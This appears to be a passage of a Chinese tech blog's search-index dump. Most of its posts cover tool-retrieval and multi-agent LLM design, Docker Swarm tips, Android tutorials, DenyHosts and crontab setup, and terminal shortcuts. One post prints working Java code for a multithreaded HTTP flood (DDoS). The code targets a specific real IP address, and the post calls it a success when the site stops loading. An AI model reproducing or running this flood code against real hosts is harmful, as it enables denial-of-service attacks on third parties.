--&gt; L[ChromaDB]\n    L --&gt; M[存储工具定义]\n    L --&gt; N[存储工具嵌入]\n\n    F --&gt; O[语义搜索]\n    O --&gt; P[相似度匹配]\n\n工具嵌入flowchart TD\n    A[初始化 ToolLibrary] --&gt; B[设置基本参数]\n    B --&gt; C[创建嵌入模型客户端]\n    C --&gt; D[初始化 FunctionAnalyzer]\n    D --&gt; E[设置超时参数]\n    E --&gt; F[创建/连接 ChromaDB]\n    F --&gt; G[获取已存储的工具]\n\n    G --&gt; H&#123;检查已存储工具&#125;\n    H --&gt;|工具有效| I[加载到内存]\n    H --&gt;|工具无效| J[从向量存储中删除]\n\n    I --&gt; K&#123;是否有新工具导入?&#125;\n    J --&gt; K\n\n    K --&gt;|是| L[从文件导入工具]\n    K --&gt;|是| M[从实例导入工具]\n    K --&gt;|否| N[初始化完成]\n\n    L --&gt; O[保存新工具到向量存储]\n    M --&gt; O\n    O --&gt; N\n\n优化方向\n增加问题转译，将问题转译为更利于工具搜索的格式\n问题转译生成 top k 个问题，每个问题对应一个工具集，召回后去重\n生成 Q &amp; A 对，优化特定问题\n\n分组加载方案原理概述分组加载方案是解决大规模工具集管理的关键策略之一。当工具数量增长到一定规模时，将所有工具描述同时传入LLM会迅速耗尽上下文长度限制。分组加载方案通过智能监测和动态分组，确保在token限制内最大化工具使用效率。\n核心组件\nToken监测器：\n\n实时计算每个工具描述的token数量\n预估不同工具组合的总token消耗\n监控LLM上下文窗口剩余容量\n\n\n工具分组引擎：\n\n基于语义相似性聚类相关工具\n根据使用频率和历史相关性进行优先级排序\n维护工具之间的依赖关系图\n\n\nLLM调用协调器：\n\n管理多轮工具加载和LLM调用\n在工具组之间传递上下文和状态\n汇总多次调用的结果\n\n\n\n工作流程flowchart TD\n    A[用户查询] --&gt; B[查询分析器]\n    B --&gt; C[工具相关性评分]\n    C --&gt; D[Token计算]\n    D --&gt; E&#123;Token超限?&#125;\n\n    E --&gt;|否| F[单次加载所有工具]\n    E --&gt;|是| G[启动分组加载流程]\n\n    G --&gt; H[工具聚类分组]\n    H --&gt; I[优先级排序]\n    I --&gt; J[分批LLM调用]\n\n    J --&gt; K[结果汇总]\n    F --&gt; K\n\n    K --&gt; L[响应用户]\n\n    M[用户反馈] --&gt; N[更新工具使用统计]\n    N --&gt; O[优化分组策略]\n\n分组策略分组加载采用多种策略来优化工具分组：\n\n基于相似度聚类：使用工具描述的语义嵌入进行聚类\n基于频率分组：常用工具优先加载\n基于任务分组：相同任务类型的工具组合在一起\n动态分组：根据当前查询实时调整分组\n\n循环加载机制graph TD\n    A[用户查询] --&gt; B[初始化工具组索引]\n    B --&gt; C[选择第一个工具组]\n    C --&gt; D[&quot;LLM调用(带工具组)&quot;]\n    D --&gt; E&#123;找到所需工具?&#125;\n\n    E --&gt;|是| F[执行工具]\n    E --&gt;|否| G&#123;还有更多工具组?&#125;\n\n    G --&gt;|是| H[加载下一工具组]\n    H --&gt; D\n\n    G --&gt;|否| I[回退到通用回答]\n\n    F --&gt; J[返回结果]\n    I --&gt; J\n\n实现示例def group_tools_by_token_limit(tools, max_tokens=4000):    # 计算每个工具描述的token数    tool_tokens = [(tool, count_tokens(f&quot;&#123;tool.name&#125;: &#123;tool.description&#125;&quot;))                   for tool in tools]    groups = []    current_group = []    current_tokens = 0    for tool, tokens in sorted(tool_tokens, key=lambda x: x[1]):        if current_tokens + tokens &gt; max_tokens:            # 当前组达到token上限，创建新组            groups.append(current_group)            current_group = [tool]            current_tokens = tokens        else:            current_group.append(tool)            current_tokens += tokens    if current_group:        groups.append(current_group)    return groupsdef cyclic_tool_execution(user_query, tool_groups):    context = &#123;&quot;query&quot;: user_query, &quot;results&quot;: []&#125;    for group_idx, tool_group in enumerate(tool_groups):        llm_response = call_llm_with_tools(            context[&quot;query&quot;],             tool_group,             f&quot;This is group &#123;group_idx+1&#125; of &#123;len(tool_groups)&#125;. &quot;            f&quot;Use these tools if they seem relevant to the query.&quot;        )        if llm_response.has_tool_calls():            tool_results = execute_tool_calls(llm_response.tool_calls)            context[&quot;results&quot;].extend(tool_results)            # 更新查询上下文            follow_up = call_llm(                f&quot;Based on these results so far: &#123;tool_results&#125;, &quot;                f&quot;should we continue searching with more tool groups? &quot;                f&quot;If yes, refine the search query.&quot;            )            if &quot;continue&quot; not in follow_up.lower():                break            context[&quot;query&quot;] = extract_refined_query(follow_up)    # 合并所有结果生成最终回答    final_answer = call_llm(        f&quot;Based on all results: &#123;context[&#x27;results&#x27;]&#125;, &quot;        f&quot;provide a comprehensive answer to the original query: &#123;user_query&#125;&quot;    )    return final_answer\n\n多Agent路由系统设计报告1. 执行摘要本报告提出了一个基于工具标签的多Agent路由系统设计方案。该系统通过为每个工具分配适用的Agent标签，实现工具到专业Agent的映射，并通过智能路由机制将用户查询分配给最合适的Agent处理。这种设计能够提高系统的响应效率、专业性和可扩展性，特别适合管理大规模工具库的场景。\n2. 系统架构graph TD\n    A[用户查询] --&gt; B[路由器Agent]\n    B --&gt; C&#123;路由决策&#125;\n    C --&gt;|金融查询| D[金融Agent]\n    C --&gt;|数据分析| E[数据分析Agent]\n    C --&gt;|系统操作| F[系统Agent]\n    C --&gt;|通用查询| G[通用Agent]\n\n    D --&gt; D1[金融工具集]\n    E --&gt; E1[数据分析工具集]\n    F --&gt; F1[系统工具集]\n    G --&gt; G1[通用工具集]\n\n    D --&gt; Z[结果整合]\n    E --&gt; Z\n    F --&gt; Z\n    G --&gt; Z\n    Z --&gt; Y[返回用户]\n\n2.1 核心组件\n增强版工具库\n\n扩展现有ToolLibrary，添加Agent标签支持\n提供工具-Agent映射管理功能\n实现基于查询的Agent推荐机制\n\n\nAgent管理器\n\n负责创建和管理专业Agent\n维护Agent与工具集的关联\n协调查询处理流程\n\n\n专业Agent\n\n每个Agent专注于特定领域\n拥有针对该领域优化的工具集\n使用定制的系统提示词增强专业能力\n\n\n路由器Agent\n\n分析用户查询意图\n结合工具相关性评估选择合适的Agent\n支持查询分解和多Agent协作\n\n\n\n3. 工具标签系统3.1 多维度标签体系graph TD\n    A[工具标签体系] --&gt; B[领域标签]\n    A --&gt; C[功能标签]\n    A --&gt; D[复杂度标签]\n    A --&gt; E[权限标签]\n\n    B --&gt; B1[金融]\n    B --&gt; B2[数据分析]\n    B --&gt; B3[系统操作]\n    B --&gt; B4[通信]\n    B --&gt; B5[文件处理]\n\n    C --&gt; C1[查询]\n    C --&gt; C2[计算]\n    C --&gt; C3[转换]\n    C --&gt; C4[生成]\n    C --&gt; C5[验证]\n\n    D --&gt; D1[简单]\n    D --&gt; D2[中等]\n    D --&gt; D3[复杂]\n\n    E --&gt; E1[低权限]\n    E --&gt; E2[中权限]\n    E --&gt; E3[高权限]\n\n3.2 标签生成策略使用LLM自动为工具生成标签，基于以下信息：\n\n工具名称和描述\n参数和返回值\n功能特性和使用场景\n\n标签生成提示词框架：\n请为以下工具分配适当的标签，以便在多Agent系统中使用：工具名称: [工具名]描述: [工具描述]参数: [参数列表]返回值: [返回值描述]请从以下类别中为该工具分配标签：1. 领域标签（选择所有适用的）：[领域选项列表]2. 功能标签（选择所有适用的）：[功能选项列表]3. 复杂度标签（选择一个）：[复杂度选项列表]4. 权限标签（选择一个）：[权限选项列表]请以JSON格式返回标签，并指明该工具最适合分配给哪些类型的Agent。\n\n4. 系统流程4.1 初始化流程sequenceDiagram\n    participant Admin as 系统管理员\n    participant TL as 工具库\n    participant AM as Agent管理器\n    participant LLM as 大型语言模型\n\n    Admin-&gt;&gt;TL: 初始化工具库\n    TL-&gt;&gt;TL: 加载工具\n\n    loop 为每个工具添加标签\n        TL-&gt;&gt;LLM: 请求生成工具标签\n        LLM--&gt;&gt;TL: 返回标签建议\n        TL-&gt;&gt;TL: 存储工具标签\n    end\n\n    Admin-&gt;&gt;AM: 创建Agent管理器\n\n    loop 创建专业Agent\n        Admin-&gt;&gt;AM: 定义Agent(名称、描述、标签)\n        AM-&gt;&gt;TL: 获取符合标签的工具\n        TL--&gt;&gt;AM: 返回工具子集\n        AM-&gt;&gt;AM: 创建专业Agent实例\n    end\n\n    Admin-&gt;&gt;AM: 创建路由器Agent\n\n4.2 查询处理流程sequenceDiagram\n    participant User as 用户\n    participant Router as 路由器Agent\n    participant TL as 工具库\n    participant SA as 专业Agent\n    participant Tool as 工具\n\n    User-&gt;&gt;Router: 提交查询\n    Router-&gt;&gt;TL: 请求Agent建议\n    TL--&gt;&gt;Router: 返回Agent建议\n\n    Router-&gt;&gt;Router: 分析查询并做出路由决策\n    Router-&gt;&gt;SA: 转发查询到选定Agent\n\n    SA-&gt;&gt;SA: 分析查询\n\n    opt 需要工具调用\n        SA-&gt;&gt;Tool: 调用工具\n        Tool--&gt;&gt;SA: 返回结果\n    end\n\n    SA-&gt;&gt;SA: 生成最终回答\n    SA--&gt;&gt;User: 返回回答\n\n5. 专业Agent配置5.1 Agent类型与职责\n\n\nAgent类型\n主要职责\n工具类别\n优化提示词重点\n\n\n\n金融Agent\n处理金融、投资、股票相关查询\n股价查询、市场分析、投资计算\n金融术语理解、数据解读、风险评估\n\n\n数据分析Agent\n处理数据处理、统计分析相关查询\n数据处理、统计计算、可视化\n数据理解、分析方法、结果解释\n\n\n系统Agent\n处理系统操作、文件管理相关查询\n文件操作、系统命令、进程管理\n系统知识、安全考虑、效率优化\n\n\n通用Agent\n处理一般性查询和跨领域问题\n所有工具的子集\n综合判断、任务分解、知识整合\n\n\n5.2 Agent系统提示词模板你是[Agent名称]，一个专门处理[Agent描述]的AI助手。你有权访问以下工具来帮助完成任务：[工具列表及描述]当用户提出问题时，请按照以下步骤操作：1. 分析用户的问题和需求2. 确定需要使用哪些工具来解决问题3. 调用适当的工具获取必要的信息4. 基于工具返回的结果，提供清晰、准确的回答[特定领域的专业指导]如果工具执行出错，请尝试理解错误原因并提供替代解决方案。始终以专业、有帮助的方式回应用户。\n\n5.3 路由器提示词模板你是一个智能路由器，负责将用户查询分配给最合适的专业Agent。可用的Agent有：[Agent列表及描述]你的任务是：1. 分析用户查询的内容和意图2. 确定哪个Agent最适合处理该查询3. 将查询转发给选定的Agent如果查询需要多个Agent协作处理，你可以将查询分解为子任务，并分配给相应的Agent。如果没有Agent明确适合处理查询，将其分配给通用Agent。请始终以JSON格式返回你的路由决策：&#123;&quot;selected_agent&quot;: &quot;agent_name&quot;, &quot;reason&quot;: &quot;选择该Agent的原因&quot;&#125;\n\n6. 实施建议6.1 分阶段实施计划\n第一阶段：基础设施建设\n\n扩展工具库，添加标签支持\n实现基本的Agent管理功能\n开发简单的路由机制\n\n\n第二阶段：专业Agent开发\n\n定义核心Agent类型\n为每种Agent优化系统提示词\n实现工具-Agent映射\n\n\n第三阶段：路由优化\n\n开发基于嵌入的相似度计算\n实现智能路由决策\n添加路由反馈机制\n\n\n第四阶段：系统集成与优化\n\n实现完整的查询处理流程\n添加性能监控和日志\n优化系统响应时间\n\n\n\n6.2 性能优化建议\n使用缓存减少重复嵌入计算\n实现并行处理多Agent查询\n预计算常见查询类型的路由决策\n定期更新工具标签以适应变化\n\n6.3 扩展性考虑\n设计模块化接口便于添加新Agent\n支持动态加载和卸载工具\n实现Agent之间的协作通信协议\n提供自定义Agent和工具标签的接口\n\n7. 评估与监控7.1 关键性能指标\n路由准确率：路由决策的正确性\n响应时间：从查询到回答的总时间\n工具使用效率：专业Agent使用工具的效率\n用户满意度：用户对回答质量的评价\n\n7.2 监控机制\n记录所有路由决策和执行结果\n跟踪每个Agent的性能指标\n分析工具使用模式和效果\n收集用户反馈并整合到系统改进中\n\n8. 结论本设计方案通过工具标签和专业Agent的结合，为大规模工具库提供了一种高效的管理和使用方式。系统的核心优势在于：\n\n专业化处理：每个Agent专注于特定领域，提高回答质量\n高效路由：智能路由机制确保查询被正确分配\n可扩展性：模块化设计便于添加新工具和Agent\n资源优化：每个Agent只加载必要的工具，减少资源消耗\n\n未来可以进一步探索的方向包括：\n\n实现Agent之间的协作机制\n添加学习功能，根据历史数据优化路由\n开发更复杂的查询分解和结果整合机制\n实现跨语言和多模态查询处理能力\n\n通过这种设计，系统能够更好地处理复杂查询，提供专业、准确的回答，同时保持良好的性能和可扩展性。\n主要开源RAG框架工具集成能力比较\n\n\n框架名称\n主要关注点\n工具集成能力\n智能体构建支持\n向量数据库支持\n许可证\nGitHub Stars (近似)\n\n\n\nLangChain\n通用LLM应用构建\n是 (丰富的预构建工具，自定义工具，工具调用)\n是 (强大的智能体构建框架)\n广泛支持\nMIT\n~105k\n\n\nDify\n低代码LLM应用开发\n是 (通过YAML配置，AgentQL集成，自定义工具)\n是 (支持代理编排)\n支持多种\nApache-2.0\n~90.5k\n\n\nLlamaIndex\n私有数据LLM连接\n是 (FunctionTool, QueryEngineTool, ToolSpecs)\n是 (FunctionAgent, ReActAgent)\n广泛支持\nMIT\n~40.8k\n\n\nHaystack\n模块化LLM应用构建\n是 (Tool类，ComponentTool，@tool装饰器)\n是 (Agent组件)\n支持多种\nApache-2.0\n~20.2k\n\n\nllmware\n企业级RAG管道\n是 (支持函数调用)\n是 (支持构建代理)\n支持多种\nApache-2.0\n~12.7k\n\n\n多智能体系统框架及其与工具集成RAG的相关性\n\n\n框架名称\n主要支持的架构\n工具集成特性\nRAG关键优势\n编程语言\n许可证\nGitHub Stars (近似)\n\n\n\nLangGraph\n网络型，监管者型，分层型，自定义工作流，群集型\n是 (通过工具调用实现智能体间交互)\n灵活的智能体协作和信息传递\nPython\nApache-2.0\n~105k\n\n\nAutoGen\n多种，强调代码生成和执行\n是 (智能体可以调用其他智能体作为工具)\n强大的代码生成和执行能力，高度可定制\nPython\nMIT\n~90.5k\n\n\nCrewAI\n团队型，基于角色和任务\n是 (智能体可以使用工具执行任务)\n更高层次的抽象，易于构建协作团队\nPython\nMIT\n~40.8k\n\n\nADK (Agent Development Kit)\n灵活，针对Gemini和Vertex AI优化\n是 (支持预构建工具，MCP工具，LangChain/LlamaIndex集成)\n针对谷歌云平台优化，支持多智能体转移和规划\nPython\nApache-2.0\n~20.2k\n\n\nTulip Agent\n灵活，支持CRUD操作工具库\n是 (通过向量存储进行语义工具搜索和执行)\n降低推理成本，支持大型工具库\nPython\nBSD-3-Clause\n~12.7k\n\n\n方案架构验证和评估以简单基准问题 + 标准问题作为验证：\n\n基准问题：\n\n查询苹果的最新股价和股息数据\n分别查询苹果的 1min、5min、15min、1h、4h 股票数据\n苹果目前的资产负债表和现金流量表怎么样？\n总结一下最近 10 条股票新闻\n从新闻角度分析特朗普币还值得买入吗？\n\n\n标准问题：\n\nPlease extract net profit, total assets and shareholders’ equity data from Netflix’s financial report, calculate its ROA and ROE, and analyze the impact of its video content capitalization policy on these indicators.\nPlease construct a rolling 12-month EBITDA chart based on the quarterly financial data in Meta’s latest annual report and mark the YoY growth rate inflection point.\nPlease analyze the changes in Apple Inc.’s (AAPL) capital structure over the past three years and calculate the changing trend of its weighted average cost of capital (WACC).\nWe extract R&amp;D spending data from Tesla’s (TSLA) 10-K reports and analyze its correlation with revenue growth.\nAnalyze the impact of Microsoft’s (MSFT) merger and acquisition activities in the past five years on its financial statements, especially the changes in goodwill and intangible assets.\n\n\n复杂问题\n\n找出今天 10 支大资金流动的股票/期货。\n\n\n\n","categories":["AI"],"tags":["人工智能"]},{"title":"Swarm集群系统搭建和管理技巧","url":"/posts/31580.html","content":"Swarm集群系统搭建和管理技巧Portainer管理面板&emsp;&emsp;针对Portainer面板这里不过详细介绍，目前Docker单节点、Swarm集群的管理面板中，没有其他面板能够媲美它了。安装也是一键搞定，所有上手使用非常轻松。Introduction - Portainer Documentation，如果不是服务器配置特别低，建议学习和自建使用可以安装上，可视化操作还是比较方便的。\n\n\n\nSwarm常用命令初始化Swarm集群&emsp;&emsp;Swarm集群需要开放2377``7946``4789这三个端口进行集群通信，特殊的主机商如阿里云文档说明4789网络作为常规的UDP通信端口，不提供给用户使用。如果出现通信异常和跨主机网络异常，需要检查这些因素。\ndocker swarm init --advertise-addr 公网IP\n\n添加节点&emsp;&emsp;添加节点的时候，最好附带上指定IP的参数--listen-addr IP地址，部分主机商多层网络比较复杂，自动获取的IP不是公网IP，而是内网的IP，导致端口即使是开放的也无法正常连接Overlay网络。\n添加manager节点docker swarm join-token manager # 获取添加命令\n\n添加worker节点docker swarm join-token worker # 获取添加命令\n\n解散集群和节点主动脱离docker swarm leave -f\n\n&emsp;&emsp;如果需要离开集群，可以在对应节点执行上面的命令。\n集群运维技巧Overlay网络连接不上的问题&emsp;&emsp;Overlay网络不通，主要是两个原因：\n\n端口未开放，无法正常通信。\n加入节点时未指明节点IP，出现节点IP无数据交换。\n\n节点无响应Swarm集群稳定性不足，重启的节点脱离后，会在节点记录之前的节点信息，重新加入节点却被认为是一个新节点，之前的集群信息未清除，导致无响应，节点异常。执行下面指令清除Swarm集群信息后，再加入集群。\ndocker swarm leave -fdocker network rm docker_gwbridgesystemctl stop dockerrm -rf /var/lib/docker/swarmsystemctl start docker\n\n另外一种情况是管理节点异常，例如3个管理节点，出现一个管理节点掉线，两个管理节点无法选举Leader节点，如果节点比较多，建议5节点或7节点，根据Raft算法，管理节点最好是基数，并且建议最多7节点。此时可以使用docker node demote 节点ID让一台管理节点变成worker节点。然后再恢复3管理节点。\n内存不足的问题由于集群的长期使用，动态更新，系统内残留无用的日志、镜像、容器、Cache会堆在内存中，一般当docker反馈这个信息的时候，已经是宿主机内存分配完了df -hl可以看到磁盘没剩多少空间了。docker system df可以查看docker使用的内存空间。docker system prune -a命令能够清空docker无用的文件，这个命令是最干净的。如果需要针对性的清除，可以清除镜像即可，例如docker image prune -a。\nService约束的使用可以通过constraints参数限制服务启动在哪个节点，一般都是添加对应的标签进行==、!=判断。例如\ndeploy:  mode: global  placement:    constraints:      - node.labels.role!=web\n\n","categories":["Docker"],"tags":["集群","Swarm","Docker","Portainer"]},{"title":"Android Studio教程：如何使用GIF图片作为应用背景","url":"/posts/53646.html","content":"\n\n\n引用第三方库1、先将你需要的GIF进行压缩，不然有可能会内存溢出\n2、将你的GIF放到drawable当中\n3、引入GIF依赖\n//引入GIF背景动态图实现依赖compile &#x27;pl.droidsonroids.gif:android-gif-drawable:1.1.+&#x27;\n\n\n4、添加自定义GIF控件\n&lt;pl.droidsonroids.gif.GifImageView    android:layout_width=&quot;match_parent&quot;    android:layout_height=&quot;match_parent&quot;    android:background=&quot;@drawable/lutos_background&quot; /&gt; \n\n5、完成\n","categories":["Android技术"],"tags":["Android","GIF","Android Studio","UI开发","第三方库"]},{"title":"Android Studio教程：如何将Module打包成Jar依赖包","url":"/posts/16151.html","content":"\n\n\n1、新建一个AS项目(不详细介绍)2、点击File-&gt;New-&gt;New Module3、选择Android Library点next4、点击Finish\n5、将要打成Jar包的类放入新建的library目录下\n6、打开新建的library下的build.gradle文件最后加入如下代码\ntask makejar(type: Copy)&#123;    //删除原来的jar包    delete &#x27;libs/test.jar&#x27;  //从该目录下拷贝生成的jar包(各版本AndroidStudio目录可能不一样最好自己检查一遍目录)    from(&#x27;build/intermediates/intermediate-jars/release/&#x27;)         //拷贝到该目录    into(&#x27;libs&#x27;)         include(&#x27;classes.jar&#x27;)    //命名文件为test.jar    rename(&#x27;classes.jar&#x27;,&#x27;test.jar&#x27;)&#125;makejar.dependsOn(build)\n\n\n7、在命令行输入gradlew makejar按回车8、等待一段时间显示build successful就可以了9、把目录显示切换成project模式在下图目录libs中就能找到了\n","categories":["Android技术"],"tags":["Android","Android Studio","Gradle","Jar","打包"]},{"title":"Android三大图片加载框架对比：Glide vs Picasso vs Fresco","url":"/posts/5489.html","content":"\n注意：第三方图片处理框架内部都已经封装了LruCatch，用来处理大图的加载，避免了OOM异常，使用了线程池来管理线程，避免了开启多个线程造成的资源的浪费，对于更新UI，内部也已经封装了Handler来进行线程间通信，将数据发送到UI线程来进行更新UI线程\nGlide：&emsp;&emsp;默认使用Hurlconnection加载图片，一个比较轻量级的图片加载框架，通过配合图片加载库的使用，可以做出多种图片加载特效：如可以自定义各种形状的图片，和图片加载的样式，另外还可以设置默认图片等等\nPicasso：&emsp;&emsp;使用okHttp加载图片，使用方式与Glide类似，而且使用的类库和Glide是相同的，实现效果是基本上一样的，也可以设置默认图片，但是Picasso这个框架默认的颜色模式是ARGB8888，Glide的颜色模式是RGB565，Glide会根据图片的宽高压缩图片，Picasso不会\nFresco：&emsp;&emsp;把图片加载后放在了供JVM使用的内存区域，提高了应用可以使用的内存大小，不会出现OOM异常，支持渐进的图片加载，内部封装了图片加载控件，相比较其他两个加载图片的框架，他的内存占用就比较小，同时他可以配合SVG图片，呈现出多种多样的样式，加载原型图片更是小意思\n","categories":["Android技术"],"tags":["Android","Glide","Picasso","Fresco","图片加载","性能优化"]},{"title":"Java实现DDoS攻击的概念与示例代码","url":"/posts/27312.html","content":"\n\n转载\n分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。\n\npublic class DDos &#123;    public static void main(String[] args) &#123;        ExecutorService es = Executors.newFixedThreadPool(1000);        Mythread mythread = new Mythread();        Thread thread = new Thread(mythread);        for (int i = 0; i &lt; 10000; i++) &#123;            es.execute(thread);        &#125;    &#125;&#125;class Mythread implements Runnable &#123;    public void run() &#123;        while (true) &#123;            try &#123;                URL url = new URL(&quot;http://221.232.148.51/guojibu/&quot;);                URLConnection conn = url.openConnection();                System.out.println(&quot;发包成功！&quot;);                BufferedInputStream bis = new BufferedInputStream(                        conn.getInputStream());                byte[] bytes = new byte[1024];                int len = -1;                StringBuffer sb = new StringBuffer();                if (bis != null) &#123;                    if ((len = bis.read()) != -1) &#123;                        sb.append(new String(bytes, 0, len));                        System.out.println(&quot;攻击成功！&quot;);                        bis.close();                    &#125;                &#125;            &#125; catch (MalformedURLException e) &#123;                // TODO Auto-generated catch block                e.printStackTrace();            &#125; catch (IOException e) &#123;                // TODO Auto-generated catch block                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n网站打不开就是攻击成功了\n","categories":["Java","网络安全"],"tags":["Java","DDoS","网络安全","多线程"]},{"title":"使用DenyHosts防止SSH暴力破解的安装与配置教程","url":"/posts/7680.html","content":"\n\n\n\nDenyHosts（项目主页：http://denyhosts.sourceforge.net/）是运行于Linux上的一款预防SSH暴力破解的软件，可以从http://sourceforge.net/projects/denyhosts/files/进行下载，然后将下载回来的DenyHosts-2.6.tar.gz源码包上传到Linux系统中。\n\n下面是安装过程\nwget https://www.cubecloud.net/DenyHosts-2.6.tar.gz           #下载安装包tar zxvf DenyHosts-2.6.tar.gz \t\t     #解压源码包cd DenyHosts-2.6\t\t\t\t\t\t #进入安装解压目录python setup.py install\t\t\t\t\t #安装DenyHostscd /usr/share/denyhosts/\t\t\t\t #默认安装路径cp denyhosts.cfg-dist denyhosts.cfg      #denyhosts.cfg为配置文件cp daemon-control-dist daemon-control    #daemon-control为启动程序chown root daemon-control  \t\t\t\t #添加root权限chmod 700 daemon-control\t\t\t\t #修改为可执行文件ln -s /usr/share/denyhosts/daemon-control /etc/init.d          #对daemon-control进行软连接，方便管理\n\n安装到这一步就完成了。\n/etc/init.d/daemon-control start    #启动denyhostschkconfig daemon-control on \t\t#将denghosts设成开机启动\n\nvi /usr/share/denyhosts/denyhosts.cfg       #编辑配置文件，另外关于配置文件一些参数，通过grep -v &quot;^#&quot; denyhosts.cfg查看SECURE_LOG = /var/log/secure                  #ssh 日志文件，redhat系列根据/var/log/secure文件来判断；Mandrake、FreeBSD根据 /var/log/auth.log来判断                                                              #SUSE则是用/var/log/messages来判断，这些在配置文件里面都有很详细的解释。\n\nHOSTS_DENY = /etc/hosts.deny                 #控制用户登陆的文件PURGE_DENY = 30m                                  #过多久后清除已经禁止的，设置为30分钟；# &#x27;m&#x27; = minutes# &#x27;h&#x27; = hours# &#x27;d&#x27; = days# &#x27;w&#x27; = weeks# &#x27;y&#x27; = yearsBLOCK_SERVICE = sshd                           #禁止的服务名，当然DenyHost不仅仅用于SSH服务DENY_THRESHOLD_INVALID = 1             #允许无效用户失败的次数DENY_THRESHOLD_VALID = 3                 #允许普通用户登陆失败的次数DENY_THRESHOLD_ROOT = 3                 #允许root登陆失败的次数DAEMON_LOG = /var/log/denyhosts      #DenyHosts日志文件存放的路径，默认\n\n更改DenyHosts的默认配置之后，重启DenyHosts服务即可生效: \n/etc/init.d/daemon-control restart #重启denyhosts","categories":["Linux","网络安全"],"tags":["网络安全","Linux","SSH","DenyHosts","服务器运维"]},{"title":"Android数据存储：SharedPreferences使用详解","url":"/posts/42127.html","content":"\n\n\n简介&emsp;&emsp;SharedPreferences是使用键值对来存储数据的，所以每当保存和取出一条数据，需要给这条数据提供一个对应的键。而且SharedPreferences是支持多种不同的数据类型存储，也就是当存入的数据类型是什么样，取出来就是什么样的。SharedPreferences进行数据持久化要比使用文件方便的多。\n将数据存进SharedPreferences&emsp;&emsp;要使用SharedPreferences存储数据，首先要获取SharedPreferences对象，Android提供的三种获取SharedPreferences对象的方法。\n\nContext类中的getSharedPreferences()方法\n此方法接收两个参数。\n\n①用于指定SharedPreferences文件名称  //不存在则创建一个，存放/data/data/&lt;packge name&gt;/shared_prefs/目录下\n②用于指定操作模式  //目前只有MODE_PRIVATE可选，传入0值相同，其他模式均被抛弃\n\n\nActivity类中的getPreferences()方法\n该方法只接收操作模式MODE_PRIVATE，该方法被调用的时候自动以当前活动的类名作为SharedPerferences的文件名。\n\nPreferenceManager类中的getDefaultSharedPreferences()方法\n这是一个静态的方法，它接收一个Context参数，并自动使用当前程序的包名为前缀命名SharedPerferences文件。\n\n\n获取SharedPerferences对象后，就能向SharedPreferences中添加数据了，分3步实现\n\n⑴调用SharedPerferences对象的edit()方法来获取一个SharedPerferences.Editor对象。\n⑵向SharedPerferences.Editor对象中添加数据，比如添加一个布尔型数据就使用putBoolean()方法，添加一个字符串就使用putString()方法，以此类推。\n⑶调用apply()方法将添加的数据提交，从而完成数据存储操作。\n\n从SharedPreferences中取出数据&emsp;&emsp;SharedPerferences对象提供了getString（）等方法对数据进行读取，get方法均要传入两个参数，第一个为键，第二个为默认值，例如getSharedPreferences(&quot;data&quot;,MODE_PRIVATE).getString(&quot;name&quot;,&quot;&quot;)、getSharedPreferences(&quot;data&quot;,MODE_PRIVATE).getBoolean(&quot;eated&quot;,false)。读取的SharedPreferences对象创建方法，应该和存储的SharedPreferences对象一样，否则会找不到SharedPreferences文件。\n注：Ctrl + P可以查看一个方法的参数类型，规范的代码会带有注释说明。自动补全在类名后加点可以查看该类可以被外部引用的方法。Ctrl+点击进去代码查看也可以。\n","categories":["Android技术"],"tags":["Android","SharedPreferences","数据存储","键值对"]},{"title":"Linux Crontab 安装使用详细说明","url":"/posts/56521.html","content":"\n\n\n\n&emsp;&emsp;crontab命令常见于Unix和Linux的操作系统之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于“crontab”文件中，以供之后读取和执行。通常，crontab储存的指令被守护进程激活。crond 常常在后台运行，每一分钟检查是否有预定的作业需要执行。这类作业一般称为cron jobs。\n\n\n\n一、安装yum -y install vixie-cronyum -y install crontabs\n\n说明：vixie-cron 软件包是 cron 的主程序；crontabs 软件包是用来安装、卸装、或列举用来驱动 cron 守护进程的表格的程序。\n二、配置cron 是 linux 的内置服务，但它不自动起来，可以用以下的方法启动、关闭这个服务： \nservice crond start     //启动服务service crond stop      //关闭服务service crond restart   //重启服务service crond reload    //重新载入配置service crond status    //查看crontab服务状态\n\n 在CentOS系统中加入开机自动启动:  \nchkconfig --level 345 crond on\n\n列子：01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly","categories":["Linux","系统管理"],"tags":["Linux","Crontab","定时任务","Shell"]},{"title":"Linux中实用但很小众的11个炫酷终端命令","url":"/posts/44609.html","content":"&emsp;今天给大家分享Linux总结出来的11个炫酷的Linux终端命令大全，通过今天这篇文章将向大家展示一系列的Linux命令、工具和技巧，我希望一开始就有人告诉我这些，而不是曾在我成长道路上绊住我。\n命令行日常系快捷键如下的快捷方式非常有用，能够极大的提升你的工作效率：\nCTRL + U -剪切光标前的内容\nCTRL + K -剪切光标至行末的内容\nCTRL + Y -粘贴\nCTRL + E -移动光标到行末\nCTRL + A -移动光标到行首\nALT + F -跳向下一个空格\nALT + B -跳回上一个空格\nALT + Backspace -删除前一个单词\nCTRL + W -剪切光标后一个单词\nShift + Insert -向终端内粘贴文本\n那么为了让上述内容更易理解来看下面的这行命令。\nsudo apt-get intall programname \n\n\n\n如你所见，命令中存在拼写错误，为了正常执行需要把”intall”替换成”install”。\n想象现在光标正在行末，我们有很多的方法将她退回单词install并替换它。\n我可以按两次ALT+B这样光标就会在如下的位置(这里用指代光标的位置)。\nsudo apt-get^intall programname \n\n\n\n现在你可以按两下方向键并将”s”插入到install中去了。\n如果你想将浏览器中的文本复制到终端，可以使用快捷键”shift + insert”。\nSUDO !!如果你还不知道这个命令，我觉得你应该好好感谢我，因为如果你不知道的话，那每次你在输入长串命令后看到”permission denied”后一定会痛苦不堪。\nsudo !!\n如何使用sudo !!?很简单。试想你刚输入了如下命令：\napt-get install ranger \n\n\n\n一定会出现”Permission denied”，除非你已经登录了足够高权限的账户。\nsudo !!就会用sudo的形式运行上一条命令。所以上一条命令就变成了这样：\nsudo apt-get install ranger 